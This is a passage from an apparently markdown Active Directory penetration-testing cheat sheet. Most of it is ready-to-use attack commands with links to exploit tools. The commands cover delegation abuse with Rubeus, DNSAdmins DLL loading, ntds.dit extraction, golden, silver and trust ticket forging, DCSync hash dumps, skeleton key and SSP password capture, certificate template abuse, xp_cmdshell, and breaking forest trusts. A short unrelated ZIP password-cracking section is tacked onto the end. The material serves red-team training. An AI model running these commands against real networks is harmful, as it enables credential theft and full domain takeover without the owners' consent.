Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

Detailed Articles:

- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.

```powershell
#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap
```

Detailed Article:
[Rubeus – Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

### DNSAdmins Abuse

_WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._

1. Enumerate the members of the DNSAdmins group:
   - PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
   - AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
2. Once we found a member of this group we need to compromise it (There are many ways).
3. Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:

   ```powershell
   #Using dnscmd:
   dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

   #Restart the DNS Service:
   sc \\DNSServer stop dns
   sc \\DNSServer start dns
   ```

### Abusing Active Directory-Integraded DNS

- [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
- [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

### Abusing Backup Operators Group

_WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._

1. Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:

   ```powershell
   #Create a .txt file that will contain the shadow copy process script
   Script ->{
   set context persistent nowriters
   set metadata c:\windows\system32\spool\drivers\color\example.cab
   set verbose on
   begin backup
   add volume c: alias mydrive

   create

   expose %mydrive% w:
   end backup
   }

   #Execute diskshadow with our script as parameter
   diskshadow /s script.txt
   ```

2. Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
   simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
   going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:

   ```powershell
   #Importing both dlls from the repo using powershell
   Import-Module .\SeBackupPrivilegeCmdLets.dll
   Import-Module .\SeBackupPrivilegeUtils.dll

   #Checking if the SeBackupPrivilege is enabled
   Get-SeBackupPrivilege

   #If it isn't we enable it
   Set-SeBackupPrivilege

   #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
   Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

   #Dump the SYSTEM hive
   reg save HKLM\SYSTEM c:\temp\system.hive
   ```

3. Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
4. Use secretsdump.py from impacket and dump the hashes.
5. Use psexec or another tool of your choice to PTH and get Domain Admin access.

### Abusing Exchange

- [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange

### Weaponizing Printer Bug

- [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
- [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

### Abusing ACLs

- [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [aclpwn.py](https://github.com/fox-it/aclpwn.py)
- [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

### Abusing IPv6 with mitm6

- [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [mitm6](https://github.com/fox-it/mitm6)

### SID History Abuse

_WUT IS DIS?: If we manage to compromise a child domain of a forest and [SID filtering](https://www.itprotoday.com/windows-8/sid-filtering) isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the [SID History](https://www.itprotoday.com/windows-8/sid-history) field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._

Exploitation example:

```powershell
#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
```

Detailed Articles:

- [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
- [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

### Exploiting SharePoint

- [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation \
  [PoC](https://github.com/k8gege/CVE-2019-0604)
- [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Code execution through BDC deserialization
- [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters \
  [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

### Zerologon

- [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/whitepapers/zerologon-whitepaper): White paper of the vulnerability.
- [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C# implementation of the Zerologon exploit.
- [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): PowerShell implementation of the Zerologon exploit.
- [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.

### PrintNightmare

- [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Vulnerability details.
- [Impacket implementation of PrintNightmare](https://github.com/cube0x0/CVE-2021-1675): Reliable PoC of PrintNightmare using the impacket library.
- [C# Implementation of CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Reliable PoC of PrintNightmare written in C#.

### Active Directory Certificate Services

**Check for Vulnerable Certificate Templates with:** [Certify](https://github.com/GhostPack/Certify)

_Note: Certify can be executed with Cobalt Strike's `execute-assembly` command as well_

```powershell
.\Certify.exe find /vulnerable /quiet
```

Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights
allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.

This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA")
and use the captured certificate with Rubeus to forge authentication.

_Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target._

Request the DA's Account Certificate with Certify

```powershell
.\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
```

This should return a valid certificate for the associated DA account.

The exported `cert.pem` and `cert.key` files must be consolidated into a single `cert.pem` file, with one gap of whitespace between the `END RSA PRIVATE KEY` and the `BEGIN CERTIFICATE`.

_Example of `cert.pem`:_

```
-----BEGIN RSA PRIVATE KEY-----
BIIEogIBAAk15x0ID[...]
[...]
[...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
BIIEogIBOmgAwIbSe[...]
[...]
[...]
-----END CERTIFICATE-----
```

#Utilize `openssl` to Convert to PKCS #12 Format

The `openssl` command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Once the `cert.pfx` file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, `certutil.exe`, Cobalt Strike's upload functionality, etc.)

After the `cert.pfx` file has been uploaded to the compromised host, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a Kerberos TGT for the DA account which will then be imported into memory.

```powershell
.\Rubeus.exe asktht /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
```

This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.

### No PAC

- [sAMAccountname Spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) Exploitation of CVE-2021-42278 and CVE-2021-42287
- [Weaponisation of CVE-2021-42287/CVE-2021-42278](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html) Exploitation of CVE-2021-42278 and CVE-2021-42287
- [noPAC](https://github.com/cube0x0/noPac) C# tool to exploit CVE-2021-42278 and CVE-2021-42287
- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287
- [noPac](https://github.com/Ridter/noPac) Evolution of "sam-the-admin" tool

## Domain Persistence

### Golden Ticket Attack

```powershell
#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

#On any machine:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### DCsync Attack

```powershell
#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
```

**Tip:** \
 /ptt -> inject ticket on current running session \
 /ticket -> save the ticket on the system for later use

### Silver Ticket Attack

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

[SPN List](https://adsecurity.org/?page_id=183)

### Skeleton Key Attack

```powershell
#Exploitation Command runned as DA:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>

#Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### DSRM Abuse

_WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_

```powershell
#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName <DC's Name>

#Alter the Logon behaviour on registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

Then just PTH to get local admin access on DC!

### Custom SSP

_WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!_

From powershell:

```powershell
#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += "mimilib"

#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command '"misc::memssp"'
```

Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log

## Cross Forest Attacks

### Trust Tickets

_WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT._

:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!

- Using Mimikatz:

  ```powershell
  #Dump the trust key
  Invoke-Mimikatz -Command '"lsadump::trust /patch"'
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  #Forge an inter-realm TGT using the Golden Ticket attack
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:
  <OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
  <PathToSaveTheGoldenTicket>"'
  ```

  :exclamation: Tickets -> .kirbi format

  Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!

- Using Rubeus:

  ```powershell
  .\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
  ```

### Abuse MSSQL Servers

- Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
- Check Accessibility as current user:

  ```powershell
  Get-SQLConnectionTestThreaded
  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
  ```

- Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
- Abusing SQL Database Links: \
  _WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!_

Check for existing Database Links:

```powershell
#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instance <SPN> -Verbose

#MSSQL Query:
select * from master..sysservers
```

Then we can use queries to enumerate other links from the linked Database:

```powershell
#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')

#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose

#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```

Query execution:

```powershell
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

### Breaking Forest Trusts

_WUT IS DIS?: \
TL;DR \
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest._

Tools we are going to use:

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

Exploitation example:

```powershell
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all
```

Detailed Articles:

- [Not A Security Boundary: Breaking Forest Trusts](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

### AD Mindmap 
[MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)









## ZIP

```
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip

zip2john file.zip > zip.john
john --wordlist=<PASSWORDS_LIST> zip.john
```
